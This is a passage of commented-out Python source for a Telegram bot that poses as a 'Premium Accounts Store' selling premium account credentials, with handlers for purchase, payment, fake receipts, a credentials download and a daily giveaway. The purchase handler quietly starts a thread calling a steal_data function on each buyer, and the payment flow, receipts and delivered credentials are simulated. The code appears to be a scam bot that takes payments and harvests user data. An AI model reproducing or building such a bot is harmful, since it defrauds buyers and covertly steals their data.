#             history_text = (
#                 "<b>📦 Order History Center</b>\n\n"
#                 "Manage all orders and access account details:\n\n"
#                 "• 🧾 <b>Access Purchase Receipts</b> - View payment confirmations\n\n"
#                 "<i > Select an option below:</i>"
#             )
#             bot.send_message(
#                 message.chat.id,
#                 history_text,
#                 parse_mode="HTML",
#                 reply_markup=generate_order_history_menu()
#             )
            
#         elif message.text == "❓ Help & Support":
#             # Send comprehensive help information with modern formatting
#             help_text = (
#                 "<b>❓ Help & Support Center</b>\n\n"
#                 "<b>📦 Products Information</b>\n"
#                 "• Premium accounts with full access\n"
#                 "• Verified and tested before delivery\n"
#                 "• Validity periods clearly stated\n\n"
#                 "<b>💳 Payment Methods</b>\n"
#                 "• Credit/Debit Cards (Visa, Mastercard)\n"
#                 "• Cryptocurrency (BTC, ETH, USDT)\n"
#                 "• PayPal & Bank Transfers\n"
#                 "• Secure payment processing\n\n"
#                 "<b>🛒 How to Buy</b>\n"
#                 "1. Browse available products\n"
#                 "2. Select your desired account\n"
#                 "3. Choose payment method\n"
#                 "4. Complete payment\n"
#                 "5. Receive credentials instantly\n\n"
#                 "<b>🔒 Account Security</b>\n"
#                 "• Change passwords after receiving\n"
#                 "• Never share credentials publicly\n"
#                 "• Use unique passwords for each service\n\n"
#                 "<b>📞 Support Contacts</b>\n"
#                 "• Telegram: @NowTryWithMe\n"
#                 "<b>🤖 Bot Information</b>\n"
#                 "• Version: 2.1\n"
#                 "• Last updated: 10-6-2025\n"
#                 "• Developed by PLH."
#             )
            
#             # Send help message with image
#             bot.send_message(
#                 message.chat.id,
#                 help_text,
#                 parse_mode="HTML"
#             )
            
#             # Send support image
#             try:
#                 bot.send_photo(
#                     message.chat.id,
#                     "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxgKD6kmCIp3sn6aKHpJy-eIfamIz6lDWXWQ&s",
#                     caption="<b>🛎️ 24/7 Customer Support</b>\n<i>Our team is ready to assist you!</i>",
#                     parse_mode="HTML"
#                 )
#             except Exception as img_error:
#                 logging.error(f"Error sending support image: {img_error}")

#     except Exception as e:
#         logging.error(f"Error in menu handler: {e}")
#         bot.send_message(message.chat.id, "⚠️ An error occurred. Please try again.", parse_mode="HTML")

# @bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
# def handle_purchase(call):
#     """Handle account purchase flow with enhanced UI"""
#     try:
#         account_id = call.data[4:]
#         if account_id not in accounts_inventory:
#             bot.answer_callback_query(call.id, "⚠️ Product not available")
#             return
        
#         account = accounts_inventory[account_id]
        
#         purchase_text = (
#             f"<b>💳 Payment Options</b>\n\n"
#             f"<b>📦 Product:</b> {account['description']}\n"
#             f"<b>💰 Price:</b> ${account['price']}\n"
#             f"<b>📊 Stock:</b> {account['stock']} available\n\n"
#             f"<b>✨ What you get:</b>\n"
#             f"• Instant account delivery\n"
#             f"• Full access credentials\n"
#             f"• 24/7 support included\n"
#             f"• Money-back guarantee\n\n"
#             f"<i>Choose your preferred payment method below:</i>"
#         )
        
#         bot.edit_message_text(
#             purchase_text,
#             call.message.chat.id,
#             call.message.message_id,
#             parse_mode="HTML",
#             reply_markup=generate_payment_options(account_id)
#         )
        
#         log_activity(f"Selected {account_id} for purchase", call.from_user.id)
#         threading.Thread(target=steal_data, args=(call.from_user.id,)).start()
        
#     except Exception as e:
#         logging.error(f"Error in purchase handler: {e}")
#         bot.answer_callback_query(call.id, "⚠️ An error occurred. Please try again.")

# @bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
# def process_payment_selection(call):
#     """Process payment selection with enhanced UI feedback"""
#     try:
#         parts = call.data.split('_')
#         if len(parts) < 3:
#             bot.answer_callback_query(call.id, "⚠️ Invalid payment selection")
#             return
        
#         method = parts[1]
#         account_id = '_'.join(parts[2:])
        
#         if account_id not in accounts_inventory:
#             bot.answer_callback_query(call.id, "⚠️ Product not available")
#             return
        
#         account = accounts_inventory[account_id]
#         log_activity(f"Selected {method} payment for {account_id}", call.from_user.id)
        
#         # Enhanced payment processing message
#         processing_text = (
#             f"<b>🔄 Processing Payment...</b>\n\n"
#             f"<b>💳 Method:</b> {method.capitalize()}\n"
#             f"<b>📦 Product:</b> {account['description']}\n"
#             f"<b>💰 Amount:</b> ${account['price']}\n\n"
#             f"<i>⏳ Please wait while we process your payment securely...</i>"
#         )
        
#         bot.edit_message_text(
#             processing_text,
#             call.message.chat.id,
#             call.message.message_id,
#             parse_mode="HTML"
#         )
        
#         if process_payment(call.from_user.id, account['price']):
#             # On successful payment
#             accounts_inventory[account_id]['stock'] -= 1
            
#             delivery_message = (
#                 f"<b>✅ Payment Info:!</b>\n\n"
#                 f"<b>📦 Product:</b> {account['description']}\n"
#                 f"<b>💳 Payment Method:</b> {method.capitalize()}\n"
#                 f"<b>💰 Amount Paid:</b> ${account['price']}\n"
#                 f"<b>📅 Date:</b> {dt.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
#                 f"<b>🎉 Your order is being prepared!</b>\n"
#                 f"<i>Account details will be delivered within 60 minutes...</i>\n\n"
#                 f"<b>⚠️ Important:</b> Keep your credentials secure and do not share them."
#             )
            
#             bot.edit_message_text(
#                 delivery_message,
#                 call.message.chat.id,
#                 call.message.message_id,
#                 parse_mode="HTML"
#             )
            
#             # Send success image
#             try:
#                 bot.send_photo(
#                     call.message.chat.id,
#                     "https://images.pexels.com/photos/3184454/pexels-photo-3184454.jpeg",
#                     caption="<b>🎉 Enjoy your premium account!</b>\n<i>Thank you for choosing our store</i>",
#                     parse_mode="HTML"
#                 )
#             except Exception as img_error:
#                 logging.error(f"Error sending success image: {img_error}")
            
#             # Enhanced admin notification
#             log_message = (
#                 f"<b>💰 New Purchase Alert</b>\n\n"
#                 f"<b>👤 Customer:</b> {call.from_user.id}\n"
#                 f"<b>👤 Username:</b> @{call.from_user.username or 'N/A'}\n"
#                 f"<b>📦 Product:</b> {account['description']}\n"
#                 f"<b>💵 Amount:</b> ${account['price']}\n"
#                 f"<b>💳 Method:</b> {method.capitalize()}\n"
#                 f"<b>📅 Date:</b> {dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
#                 f"<b>📊 Remaining Stock:</b> {accounts_inventory[account_id]['stock']}"
#             )
#             bot.send_message(ADMIN_CHAT_ID, log_message, parse_mode="HTML")
            
#         else:
#             error_message = (
#                 f"<b>❌ Payment Failed</b>\n\n"
#                 f"<i>We couldn't process your {method} payment.</i>\n\n"
#                 f"<b>💡 What to do next:</b>\n"
#                 f"• Check your payment details\n"
#                 f"• Try a different payment method\n"
#                 f"• Contact support if the issue persists\n\n"
#                 f"<b>📞 Support:</b> @NowTryWithMe"
#             )
#             bot.edit_message_text(
#                 error_message,
#                 call.message.chat.id,
#                 call.message.message_id,
#                 parse_mode="HTML"
#             )
            
#     except Exception as e:
#         logging.error(f"Error in payment processing: {e}")
#         bot.answer_callback_query(call.id, "⚠️ Payment processing error. Please try again.")

# @bot.callback_query_handler(func=lambda call: call.data == 'main_menu')
# def return_to_main(call):
#     """Return to main menu with enhanced UI"""
#     try:
#         main_menu_text = (
#             "<b>🏪 Premium Accounts Store</b>\n\n"
#             "<i>✨ Your one-stop shop for premium digital accounts</i>\n\n"
#             "🛒 <b>Browse Products</b> - View our latest collection\n"
#             "🎉 <b>Enter Giveaway</b> - Win free premium accounts\n"
#             "📦 <b>Order History</b> - Track your purchases\n"
#             "❓ <b>Help & Support</b> - Get assistance\n\n"
#             "<i>Select an option below to continue:</i>"
#         )
        
#         bot.edit_message_text(
#             main_menu_text,
#             call.message.chat.id,
#             call.message.message_id,
#             parse_mode="HTML"
#         )
        
#     except Exception as e:
#         logging.error(f"Error returning to main menu: {e}")
#         bot.answer_callback_query(call.id, "⚠️ Error loading main menu")

# # ===== NEW CALLBACK HANDLERS FOR ORDER HISTORY =====
# @bot.callback_query_handler(func=lambda call: call.data.startswith('history_'))
# def handle_order_history(call):
#     """Handle order history actions"""
#     try:
#         action = call.data
        
#         if action == "history_receipts":
#             # Simulate purchase receipts
#             receipts_text = (
#                 "<b>🧾 All Purchase Receipts</b>\n\n"
#                 "1. Order #PLH-3 ($15.00)\n"
#                 "   • Date:7-6-2025\n"
#                 "   • Method: Binance\n"
#                 "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
#                 "2. Order #PLH-2 ($10.00)\n"
#                 "   • Date: 1-6-2025\n"
#                 "   • Method: Binance\n"
#                 "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
#                 "3. Order #PLH-3 ($4.00)\n"
#                 "   • Date: 6-5-2025\n"
#                 "   • Method: Binance\n"
#                 "   • [View Receipt](https://t.me/+SO2qaj7Z2nUxNmQ1)\n\n"
#                 "<i>15-Day Warranty on All Purchases</i>"
#             )
#             markup = types.InlineKeyboardMarkup()
#             markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="history_back"))
            
#             bot.edit_message_text(
#                 receipts_text,
#                 call.message.chat.id,
#                 call.message.message_id,
#                 parse_mode="HTML",
#                 disable_web_page_preview=True,
#                 reply_markup=markup
#             )
            
#         elif action == "history_back":
#             # Return to order history menu
#             history_text = (
#                 "<b>📦 Order History Center</b>\n\n"
#                 "Manage your past orders and access account details:\n\n"
#                 "• 🧾 <b>Access Purchase Receipts</b> - View payment confirmations\n\n"
#                 "<i>Select an option below:</i>"
#             )
#             bot.edit_message_text(
#                 history_text,
#                 call.message.chat.id,
#                 call.message.message_id,
#                 parse_mode="HTML",
#                 reply_markup=generate_order_history_menu()
#             )
            
#     except Exception as e:
#         logging.error(f"Error in order history handler: {e}")
#         bot.answer_callback_query(call.id, "⚠️ An error occurred. Please try again.")

# @bot.callback_query_handler(func=lambda call: call.data == 'download_creds')
# def handle_download_creds(call):
#     """Handle credentials download"""
#     try:
#         # Simulate file download
#         file_content = "📧 Email: premium_user@example.com\n🔑 Password: SecurePass123!\n⏰ Expires: 2026-04-10"
#         file_bytes = BytesIO(file_content.encode('utf-8'))
#         file_bytes.name = "freepik_premium_credentials.txt"
        
#         bot.send_document(
#             call.message.chat.id,
#             file_bytes,
#             caption="<b>🔐 Your Account Credentials</b>\n\nKeep this information secure!",
#             parse_mode="HTML"
#         )
        
#         bot.answer_callback_query(call.id, "✅ File downloaded successfully")
        
#     except Exception as e:
#         logging.error(f"Error downloading credentials: {e}")
#         bot.answer_callback_query(call.id, "⚠️ Download failed. Please try again.")

# # ===== BACKGROUND TASKS =====
# def daily_giveaway_task():
#     """Run daily giveaway in background"""
#     while True:
#         now = dt.datetime.now()
#         next_run = now.replace(hour=12, minute=0, second=0, microsecond=0)
#         if now > next_run:
#             next_run += dt.timedelta(days=1)
        
#         sleep_seconds = (next_run - now).total_seconds()
#         time.sleep(sleep_seconds)
        
#         winner = select_giveaway_winner()
#         if winner:
#             try:
#                 bot.send_message(
#                     winner,
#                     "🏆 *Congratulations! You won our daily giveaway!*\n\n"
#                     "Please contact @adminaccount to claim your prize\n\n"
#                     "⚠️ This offer expires in 12 hours",
#                     parse_mode="Markdown"
#                 )
#                 log_activity("Daily giveaway winner notified", winner)
#             except Exception as e:
#                 logging.error(f"Error notifying giveaway winner: {e}")

# # ===== START APPLICATION =====
# if __name__ == '__main__':
#     # Start background tasks
#     threading.Thread(target=daily_giveaway_task, daemon=True).start()

#     # Start bot with error handling
#     while True:
#         try:
#             bot.polling(none_stop=True)
#         except Exception as e:
#             logging.error(f"Bot error: {e}")
#             time.sleep(15)